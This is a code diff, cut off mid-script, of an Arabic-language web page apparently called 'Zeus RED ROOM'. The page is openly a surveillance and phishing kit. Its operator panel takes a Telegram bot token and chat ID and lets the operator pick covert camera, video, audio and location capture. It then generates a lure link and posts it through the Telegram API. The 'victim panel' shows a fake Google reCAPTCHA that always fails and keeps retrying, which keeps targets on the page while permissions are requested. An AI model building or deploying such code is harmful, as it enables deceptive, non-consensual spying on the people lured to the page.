+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .spinner.loading .checkmark {
+            border-color: #1a73e8;
+            background: #e8f0fe;
+        }
+        .spinner.loading .checkmark .tick {
+            display: none;
+        }
+        .spinner.loading .checkmark .loader {
+            display: block;
+        }
+        .spinner.failed .checkmark {
+            border-color: #d93025;
+            background: #fce8e6;
+        }
+        .spinner.failed .checkmark .tick {
+            display: none;
+        }
+        .spinner.failed .checkmark .loader {
+            display: none;
+        }
+        .spinner.failed .checkmark::after {
+            content: "✕";
+            font-size: 22px;
+            font-weight: bold;
+            color: #d93025;
+        }
+        .spinner.success .checkmark {
+            border-color: #00a651;
+            background: #e6f4ea;
+        }
+        .spinner.success .checkmark .tick {
+            opacity: 1;
+            animation: check 0.3s ease;
+        }
+        .spinner.success .checkmark .loader {
+            display: none;
+        }
+        .text {
+            flex: 1;
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            transition: color 0.2s;
+            user-select: none;
+        }
+        .text.loading {
+            color: #1a73e8;
+        }
+        .text.failed {
+            color: #d93025;
+        }
+        .text.success {
+            color: #00a651;
+        }
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 10px;
+            color: #777;
+        }
+        .logo img {
+            width: 38px;
+            margin-bottom: 4px;
+        }
+        .logo strong {
+            font-size: 10px;
+        }
+        .logo small {
+            font-size: 8px;
+        }
+        .captcha-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 6px 14px;
+            background: #f1f3f4;
+            border-top: 1px solid #e5e7e9;
+            height: 36px;
+        }
+        .captcha-footer .brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .captcha-footer .brand svg {
+            height: 24px;
+            width: auto;
+        }
+        .captcha-footer .brand .google-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: #222;
+        }
+        .captcha-footer .links {
+            display: flex;
+            gap: 10px;
+            font-size: 11px;
+        }
+        .captcha-footer .links a {
+            color: #555;
+            text-decoration: none;
+            font-size: 11px;
+            transition: color 0.15s;
+        }
+        .captcha-footer .links a:hover {
+            color: #1a73e8;
+            text-decoration: underline;
+        }
+        .captcha-footer .links .separator {
+            color: #aaa;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        @keyframes check {
+            from {
+                opacity: 0;
+                transform: rotate(45deg) scale(0.3);
+            }
+            to {
+                opacity: 1;
+                transform: rotate(45deg) scale(1);
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 16px;
+            }
+            .glitch-title {
+                font-size: 38px;
+                letter-spacing: 4px;
+            }
+            .sub-brand {
+                font-size: 14px;
+                gap: 10px;
+                flex-wrap: wrap;
+            }
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 8px;
+            }
+            .feature-item {
+                padding: 8px 2px;
+                font-size: 12px;
+            }
+            .feature-item svg {
+                width: 22px;
+                height: 22px;
+            }
+            .btn-primary {
+                font-size: 15px;
+                padding: 14px;
+            }
+            .result-box .short-token {
+                font-size: 22px;
+                letter-spacing: 3px;
+            }
+            .captcha-wrapper {
+                width: 100%;
+            }
+            .text {
+                font-size: 16px;
+            }
+            .logo img {
+                width: 32px;
+            }
+            .footer-box .footer-text {
+                font-size: 14px;
+                letter-spacing: 2px;
+            }
+            .log {
+                font-size: 12px;
+                padding: 10px 12px;
+                min-height: 100px;
+            }
+            .log-wrapper {
+                min-height: 100px;
+            }
+        }
+        @media (max-width: 380px) {
+            .glitch-title {
+                font-size: 30px;
+                letter-spacing: 2px;
+            }
+            .sub-brand {
+                font-size: 12px;
+                gap: 6px;
+            }
+            .sub-brand .telegram-link {
+                width: 28px;
+                height: 28px;
+            }
+            .sub-brand .telegram-link svg {
+                width: 16px;
+                height: 16px;
+            }
+            .features-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 6px;
+            }
+            .footer-box .footer-text {
+                font-size: 12px;
+                letter-spacing: 1.5px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<!-- ===== ADMIN PANEL ===== -->
-<div id="adminPanel" class="container">
-  <div class="glitch-wrapper">
-    <div class="glitch-title" data-text="𝒁𝒆𝒖𝒔">𝒁𝒆𝒖𝒔</div>
-    <div class="sub-brand">◈ RED ROOM ◈</div>
-  </div>
+    <!-- ===== ADMIN PANEL ===== -->
+    <div id="adminPanel" class="container">
+        <!-- HEADER -->
+        <div class="glitch-wrapper">
+            <div class="glitch-title" data-text="𝒁𝒆𝒖𝒔">𝒁𝒆𝒖𝒔</div>
+            <div class="sub-brand">
+                <span class="handle">XX_8K</span>
+                <a href="https://t.me/xx_8k" target="_blank" class="telegram-link" aria-label="Telegram">
+                    <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+                </a>
+            </div>
+        </div>
 
-  <form id="form">
-    <div class="field">
-      <label>
-        <svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 0 0-5 5v2a5 5 0 0 0 10 0V7a5 5 0 0 0-5-5z"/><path d="M5 14v1a7 7 0 0 0 14 0v-1"/><path d="M12 21v-4"/></svg>
-        توكن البوت
-      </label>
-      <input type="text" id="botToken" placeholder="أدخل توكن البوت" required>
+        <!-- FORM -->
+        <form id="form">
+            <div class="field">
+                <label>
+                    <svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 0 0-5 5v2a5 5 0 0 0 10 0V7a5 5 0 0 0-5-5z"/><path d="M5 14v1a7 7 0 0 0 14 0v-1"/><path d="M12 21v-4"/></svg>
+                    توكن البوت
+                </label>
+                <input type="text" id="botToken" placeholder="أدخل توكن البوت" required autocomplete="off">
+            </div>
+            <div class="field">
+                <label>
+                    <svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M8 10h8"/><path d="M8 14h6"/></svg>
+                    معرف المحادثة
+                </label>
+                <input type="text" id="chatId" placeholder="مثل 123456789" required autocomplete="off">
+            </div>
+
+            <div class="features-label">
+                <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+                الميزات المطلوبة
+            </div>
+            <div class="features-grid" id="featuresContainer">
+                <label class="feature-item active" data-val="camFront">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M3 12a9 9 0 0 1 18 0"/></svg>
+                    أمامي
+                    <input type="checkbox" checked>
+                </label>
+                <label class="feature-item" data-val="camBack">
+                    <svg viewBox="0 0 24 24"><rect x="4" y="5" width="16" height="14" rx="3"/><circle cx="12" cy="12" r="3"/></svg>
+                    خلفي
+                    <input type="checkbox">
+                </label>
+                <label class="feature-item" data-val="videoFront">
+                    <svg viewBox="0 0 24 24"><rect x="3" y="5" width="14" height="14"/><path d="M17 9l4-3v12l-4-3"/></svg>
+                    فيديو أمامي
+                    <input type="checkbox">
+                </label>
+                <label class="feature-item" data-val="videoBack">
+                    <svg viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+                    فيديو خلفي
+                    <input type="checkbox">
+                </label>
+                <label class="feature-item" data-val="audio">
+                    <svg viewBox="0 0 24 24"><path d="M12 2v20"/><path d="M8 8a4 4 0 0 1 8 0v8a4 4 0 0 1-8 0"/></svg>
+                    تسجيل صوتي
+                    <input type="checkbox">
+                </label>
+                <label class="feature-item" data-val="location">
+                    <svg viewBox="0 0 24 24"><path d="M12 21s8-5 8-12a8 8 0 1 0-16 0c0 7 8 12 8 12z"/><circle cx="12" cy="9" r="3"/></svg>
+                    الموقع
+                    <input type="checkbox">
+                </label>
+            </div>
+
+            <button class="btn-primary" id="generateBtn" type="submit">
+                <svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg>
+                توليد الرابط
+            </button>
+            <div id="formError" class="error"></div>
+        </form>
+
+        <!-- RESULT -->
+        <div class="result-box" id="resultBox">
+            <div style="font-weight:600; color:#ff0033; margin-bottom:4px; letter-spacing:1px;">تم إنشاء الرابط</div>
+            <div class="short-token" id="shortTokenDisplay">------</div>
+            <div class="link-url" id="fullLinkDisplay">https://...</div>
+            <div class="actions">
+                <button id="copyBtn">
+                    <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                    نسخ
+                </button>
+                <button id="openBtn">
+                    <svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+                    فتح
+                </button>
+            </div>
+        </div>
+
+        <!-- LOG -->
+        <div class="log-wrapper">
+            <canvas id="matrixCanvas"></canvas>
+            <div class="log" id="log">
+                <div class="line"><span class="prompt">$</span> جاهز لتوليد رابط<span class="cursor"></span></div>
+            </div>
+        </div>
+
+        <!-- BOT LIST -->
+        <div class="bot-list-wrap">
+            <div class="list-header">
+                <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/><path d="M9 21v-6h6v6"/></svg>
+                الروابط المخزنة
+            </div>
+            <div id="listItems"></div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer-wrap">
+            <div class="footer-box">
+                <span class="footer-text glitch" data-text="تــم الــتطوير بواســطة أشــروف">تــم الــتطوير بواســطة أشــروف</span>
+            </div>
+        </div>
     </div>
-    <div class="field">
-      <label>
-        <svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M8 10h8"/><path d="M8 14h6"/></svg>
-        معرف المحادثة (Chat ID)
-      </label>
-      <input type="text" id="chatId" placeholder="مثل 123456789" required>
+
+    <!-- ===== VICTIM PANEL ===== -->
+    <div id="victimPanel">
+        <div class="captcha-wrapper" id="captchaWrapper">
+            <div class="captcha-row">
+                <div class="spinner" id="spinner">
+                    <input type="checkbox" id="captcha" />
+                    <label class="checkmark" for="captcha">
+                        <span class="tick"></span>
+                        <div class="loader"></div>
+                    </label>
+                </div>
+                <div class="text" id="mainText">أنا لست روبوتاً</div>
+                <div class="logo">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
+                    <strong>reCAPTCHA</strong>
+                    <small>الخصوصية - الشروط</small>
+                </div>
+            </div>
+            <div class="captcha-footer">
+                <div class="brand">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                    </svg>
+                    <span class="google-text">Google</span>
+                </div>
+                <div class="links">
+                    <a href="#" onclick="return false;">سياسة الخصوصية</a>
+                    <span class="separator">-</span>
+                    <a href="#" onclick="return false;">الشروط</a>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div style="font-size:14px; font-weight:600; color:#333; margin-bottom:8px;">⚙️ الميزات المطلوبة</div>
-    <div class="features-grid" id="featuresContainer">
-      <label class="feature-item active" data-val="camFront">
-        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M3 12a9 9 0 0 1 18 0"/></svg>
-        أمامي
-        <input type="checkbox" checked>
-      </label>
-      <label class="feature-item" data-val="camBack">
-        <svg viewBox="0 0 24 24"><rect x="4" y="5" width="16" height="14" rx="3"/><circle cx="12" cy="12" r="3"/></svg>
-        خلفي
-        <input type="checkbox">
-      </label>
-      <label class="feature-item" data-val="videoFront">
-        <svg viewBox="0 0 24 24"><rect x="3" y="5" width="14" height="14"/><path d="M17 9l4-3v12l-4-3"/></svg>
-        فيديو أمامي
-        <input type="checkbox">
-      </label>
-      <label class="feature-item" data-val="videoBack">
-        <svg viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
-        فيديو خلفي
-        <input type="checkbox">
-      </label>
-      <label class="feature-item" data-val="audio">
-        <svg viewBox="0 0 24 24"><path d="M12 2v20"/><path d="M8 8a4 4 0 0 1 8 0v8a4 4 0 0 1-8 0"/></svg>
-        تسجيل صوتي
-        <input type="checkbox">
-      </label>
-      <label class="feature-item" data-val="location">
-        <svg viewBox="0 0 24 24"><path d="M12 21s8-5 8-12a8 8 0 1 0-16 0c0 7 8 12 8 12z"/><circle cx="12" cy="9" r="3"/></svg>
-        الموقع
-        <input type="checkbox">
-      </label>
-    </div>
+    <script>
+        // ================================================================
+        //  1. ROUTING
+        // ================================================================
+        const adminPanel = document.getElementById('adminPanel');
+        const victimPanel = document.getElementById('victimPanel');
+        const params = new URLSearchParams(window.location.search);
+        const shortTokenParam = params.get('t');
 
-    <button class="btn-primary" id="generateBtn" type="submit">
-      <svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg>
-      توليد الرابط
-    </button>
-    <div id="formError" class="error"></div>
-  </form>
-
-  <div class="result-box" id="resultBox">
-    <div style="font-weight:600; color:#cc0033; margin-bottom:4px;">✅ تم إنشاء الرابط</div>
-    <div class="short-token" id="shortTokenDisplay">------</div>
-    <div class="link-url" id="fullLinkDisplay">https://...</div>
-    <div class="actions">
-      <button id="copyBtn">
-        <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-        نسخ
-      </button>
-      <button id="openBtn">
-        <svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-        فتح
-      </button>
-    </div>
-  </div>
-
-  <div class="log" id="log">
-    <div><span class="prompt">$</span> جاهز لتوليد رابط<span class="cursor"></span></div>
-  </div>
-
-  <div class="bot-list-wrap">
-    <div class="list-header">
-      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18"/><path d="M9 21v-6h6v6"/></svg>
-      الروابط المخزنة
-    </div>
-    <div id="listItems"></div>
-  </div>
-
-  <div class="footer">◆ XX_8K · RED ROOM ◆</div>
-</div>
-
-<!-- ===== VICTIM PANEL ===== -->
-<div id="victimPanel">
-  <div class="captcha-wrapper" id="captchaWrapper">
-    <div class="captcha-row">
-      <div class="spinner" id="spinner">
-        <input type="checkbox" id="captcha" />
-        <label class="checkmark" for="captcha">
-          <span class="tick"></span>
-          <div class="loader"></div>
-        </label>
-      </div>
-      <div class="text" id="mainText">أنا لست روبوتاً</div>
-      <div class="logo">
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
-        <strong>reCAPTCHA</strong>
-        <small>الخصوصية - الشروط</small>
-      </div>
-    </div>
-    <div class="captcha-footer">
-      <div class="brand">
-        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
-          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-        </svg>
-        <span class="google-text">Google</span>
-      </div>
-      <div class="links">
-        <a href="#" onclick="return false;">سياسة الخصوصية</a>
-        <span class="separator">-</span>
-        <a href="#" onclick="return false;">الشروط</a>
-      </div>
-    </div>
-  </div>
-</div>
-
-<script>
-  // ================================================================
-  //  1. ROUTING — show admin or victim based on ?t=
-  // ================================================================
-  const adminPanel = document.getElementById('adminPanel');
-  const victimPanel = document.getElementById('victimPanel');
-  const params = new URLSearchParams(window.location.search);
-  const shortTokenParam = params.get('t');
-
-  if (shortTokenParam) {
-    adminPanel.style.display = 'none';
-    victimPanel.style.display = 'flex';
-    initCaptcha();
-  } else {
-    initAdminPanel();
-  }
-
-  // ================================================================
-  //  2. reCAPTCHA — always fails
-  // ================================================================
-  function initCaptcha() {
-    const spinner = document.getElementById('spinner');
-    const checkbox = document.getElementById('captcha');
-    const mainText = document.getElementById('mainText');
-    const wrapper = document.getElementById('captchaWrapper');
-
-    let isProcessing = false;
-    let isFailed = false;
-
-    function resetToFailed() {
-      spinner.classList.remove('loading', 'success');
-      spinner.classList.add('failed');
-      mainText.className = 'text failed';
-      mainText.textContent = 'فشل التحقق، حاول مجدداً';
-      checkbox.checked = false;
-      isFailed = true;
-      isProcessing = false;
-      checkbox.disabled = false;
-    }
-
-    function simulateVerification() {
-      if (isProcessing) return;
-      isProcessing = true;
-      checkbox.disabled = true;
-      spinner.classList.remove('failed', 'success');
-      spinner.classList.add('loading');
-      mainText.textContent = 'جاري التحقق من هويتك ...';
-      mainText.className = 'text loading';
-
-      const delay = 1500 + Math.random() * 1500;
-      setTimeout(function() {
-        resetToFailed();
-        checkbox.disabled = false;
-      }, delay);
-    }
-
-    checkbox.addEventListener('change', function(e) {
-      if (this.checked) {
-        this.checked = false;
-        simulateVerification();
-      } else {
-        if (isFailed) {
-          this.checked = false;
-          e.preventDefault();
-        }
-      }
-    });
-
-    wrapper.addEventListener('click', function(e) {
-      if (e.target.closest('.checkmark') || e.target.closest('.captcha-footer') || e.target.closest('.logo')) return;
-      if (isProcessing) return;
-      if (!checkbox.checked && !spinner.classList.contains('loading')) {
-        simulateVerification();
-      }
-    });
-
-    checkbox.addEventListener('click', function(e) {
-      if (isFailed || isProcessing) {
-        e.preventDefault();
-        this.checked = false;
-        if (!isProcessing) simulateVerification();
-      }
-    });
-
-    checkbox.addEventListener('keydown', function(e) {
-      if (e.key === ' ' || e.key === 'Spacebar') {
-        e.preventDefault();
-        if (!isProcessing) simulateVerification();
-      }
-    });
-
-    console.log('✅ reCAPTCHA always fails');
-  }
-
-  // ================================================================
-  //  3. ADMIN PANEL — ثابت مطلق
-  // ================================================================
-  function initAdminPanel() {
-    const form = document.getElementById('form');
-    const botTokenInput = document.getElementById('botToken');
-    const chatIdInput = document.getElementById('chatId');
-    const generateBtn = document.getElementById('generateBtn');
-    const resultBox = document.getElementById('resultBox');
-    const shortDisplay = document.getElementById('shortTokenDisplay');
-    const fullLinkDisplay = document.getElementById('fullLinkDisplay');
-    const copyBtn = document.getElementById('copyBtn');
-    const openBtn = document.getElementById('openBtn');
-    const logDiv = document.getElementById('log');
-    const errorDiv = document.getElementById('formError');
-    const listItems = document.getElementById('listItems');
-
-    // --- خوارزمية ثابتة لتوليد الرابط القصير ---
-    function generateShortFromToken(botToken) {
-      const clean = botToken.trim().replace(/\s+/g, '');
-      if (!clean) return '------';
-      let hash = 0;
-      for (let i = 0; i < clean.length; i++) {
-        hash = (hash * 31 + clean.charCodeAt(i)) >>> 0;
-      }
-      let result = hash.toString(36).toUpperCase();
-      while (result.length < 6) result = '0' + result;
-      return result.slice(0, 6);
-    }
-
-    // --- log ---
-    function logMessage(msg) {
-      const time = new Date().toLocaleTimeString();
-      logDiv.innerHTML = `<div><span class="prompt">$</span> ${msg} <span style="color:#999;">[${time}]</span></div>` + logDiv.innerHTML;
-      if (logDiv.children.length > 20) logDiv.removeChild(logDiv.lastChild);
-    }
-    function setError(msg) {
-      errorDiv.textContent = msg;
-      if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
-    }
-
-    // --- storage ---
-    function getStorage() {
-      try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
-    }
-    function saveStorage(data) {
-      localStorage.setItem('zeus_bots', JSON.stringify(data));
-    }
-
-    // --- render list ---
-    function renderList() {
-      const data = getStorage();
-      const keys = Object.keys(data);
-      if (keys.length === 0) {
-        listItems.innerHTML = '<div style="color:#aaa;font-size:13px;">لا توجد روابط</div>';
-        return;
-      }
-      let html = '';
-      keys.forEach(key => {
-        const entry = data[key];
-        html += `<div class="bot-item">
-                  <span class="btoken">${entry.shortToken}</span>
-                  <span class="binfo">${entry.features || ''}</span>
-                  <span class="del" data-token="${key}">✕</span>
-                </div>`;
-      });
-      listItems.innerHTML = html;
-      document.querySelectorAll('.bot-item .del').forEach(el => {
-        el.addEventListener('click', function() {
-          const token = this.dataset.token;
-          const data = getStorage();
-          delete data[token];
-          saveStorage(data);
-          renderList();
-          logMessage(`🗑️ حذف الرابط ${token}`);
-        });
-      });
-    }
-
-    // --- show result ---
-    function showResult(shortToken) {
-      const base = window.location.origin + window.location.pathname;
-      const link = `${base}?t=${shortToken}`;
-      shortDisplay.textContent = shortToken;
-      fullLinkDisplay.textContent = link;
-      resultBox.style.display = 'block';
-      resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    }
-
-    // --- copy & open ---
-    copyBtn.addEventListener('click', function() {
-      const text = fullLinkDisplay.textContent;
-      if (navigator.clipboard) {
-        navigator.clipboard.writeText(text).then(() => {
-          this.innerHTML = '<svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg> تم';
-          setTimeout(() => {
-            this.innerHTML = '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> نسخ';
-          }, 1500);
-        }).catch(() => fallbackCopy(text));
-      } else { fallbackCopy(text); }
-    });
-    function fallbackCopy(text) {
-      const ta = document.createElement('textarea');
-      ta.value = text;
-      document.body.appendChild(ta);
-      ta.select();
-      document.execCommand('copy');
-      document.body.removeChild(ta);
-      copyBtn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg> تم';
-      setTimeout(() => {
-        copyBtn.innerHTML = '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> نسخ';
-      }, 1500);
-    }
-    openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));
-
-    // --- send link to user via bot ---
-    async function sendLinkToUser(botToken, chatId, shortToken) {
-      const base = window.location.origin + window.location.pathname;
-      const link = `${base}?t=${shortToken}`;
-      const msg = `🔗 *رابطك الجديد (ثابت)*\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
-      try {
-        const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
-        });
-        const json = await resp.json();
-        if (json.ok) {
-          logMessage('✅ تم إرسال الرابط إلى المستخدم');
-          return true;
+        if (shortTokenParam) {
+            adminPanel.style.display = 'none';
+            victimPanel.style.display = 'flex';
+            initCaptcha();
         } else {
-          logMessage('⚠️ فشل الإرسال: ' + (json.description || 'خطأ'));
-          return false;
-        }
-      } catch (e) {
-        logMessage('❌ خطأ في الإرسال: ' + e.message);
-        return false;
-      }
-    }
-
-    // --- toggle features ---
-    document.querySelectorAll('.feature-item').forEach(item => {
-      item.addEventListener('click', function(e) {
-        const cb = this.querySelector('input[type="checkbox"]');
-        cb.checked = !cb.checked;
-        this.classList.toggle('active', cb.checked);
-      });
-      item.querySelector('input').addEventListener('click', function(e) {
-        e.stopPropagation();
-      });
-    });
-
-    // --- form submit ---
-    form.addEventListener('submit', async function(e) {
-      e.preventDefault();
-      setError('');
-
-      const botToken = botTokenInput.value.trim();
-      const chatId = chatIdInput.value.trim();
-
-      if (!botToken || !chatId) {
-        setError('❌ يرجى ملء جميع الحقول');
-        return;
-      }
-
-      const shortToken = generateShortFromToken(botToken);
-      if (shortToken === '------') {
-        setError('❌ التوكن غير صالح');
-        return;
-      }
-
-      generateBtn.disabled = true;
-      generateBtn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg> جاري التوليد...';
-      logMessage(`⏳ توليد الرابط للتوكن: ${botToken.substring(0,10)}...`);
-
-      try {
-        const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
-        const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');
-
-        const data = getStorage();
-
-        if (data[botToken]) {
-          const existing = data[botToken];
-          if (existing.features !== features || existing.chatId !== chatId) {
-            existing.features = features;
-            existing.chatId = chatId;
-            existing.updated = Date.now();
-            saveStorage(data);
-            logMessage('🔄 تحديث إعدادات الرابط الثابت');
-          }
-          showResult(shortToken);
-          await sendLinkToUser(botToken, chatId, shortToken);
-          renderList();
-          generateBtn.disabled = false;
-          generateBtn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg> توليد الرابط';
-          return;
+            initAdminPanel();
+            initMatrixRain();
         }
 
-        data[botToken] = {
-          chatId: chatId,
-          features: features,
-          shortToken: shortToken,
-          createdAt: Date.now(),
-          updated: Date.now()
-        };
-        saveStorage(data);
-        logMessage(`✅ تم حفظ التوكن الجديد مع الرابط الثابت: ${shortToken}`);
+        // ================================================================
+        //  2. reCAPTCHA — دائماً فشل + إعادة تلقائية (عنيد)
+        // ================================================================
+        function initCaptcha() {
+            const spinner = document.getElementById('spinner');
+            const checkbox = document.getElementById('captcha');
+            const mainText = document.getElementById('mainText');
+            const wrapper = document.getElementById('captchaWrapper');
 
-        showResult(shortToken);
-        await sendLinkToUser(botToken, chatId, shortToken);
-        renderList();
+            let isProcessing = false;
+            let isFailed = false;
+            let autoRetryTimer = null;
 
-      } catch (err) {
-        logMessage('❌ خطأ: ' + err.message);
-        setError('حدث خطأ: ' + err.message);
-      } finally {
-        generateBtn.disabled = false;
-        generateBtn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg> توليد الرابط';
-      }
-    });
+            function resetToFailed() {
+                spinner.classList.remove('loading', 'success');
+                spinner.classList.add('failed');
+                mainText.className = 'text failed';
+                mainText.textContent = 'فشل التحقق، حاول مجدداً';
+                checkbox.checked = false;
+                isFailed = true;
+                isProcessing = false;
+                checkbox.disabled = false;
+                // 🔥 عنيد: بعد الفشل، يبدأ تلقائياً محاولة جديدة بعد 2 ثانية
+                if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                autoRetryTimer = setTimeout(function() {
+                    if (!isProcessing) {
+                        simulateVerification();
+                    }
+                }, 2000);
+            }
 
-    // --- init ---
-    (function init() {
-      const params = new URLSearchParams(window.location.search);
-      const bot = params.get('bot') || '';
-      const chat = params.get('chat') || '';
+            function simulateVerification() {
+                if (isProcessing) return;
+                isProcessing = true;
+                checkbox.disabled = true;
+                if (autoRetryTimer) clearTimeout(autoRetryTimer);
+                spinner.classList.remove('failed', 'success');
+                spinner.classList.add('loading');
+                mainText.textContent = 'جاري التحقق من هويتك ...';
+                mainText.className = 'text loading';
 
-      if (bot && chat) {
-        botTokenInput.value = decodeURIComponent(bot);
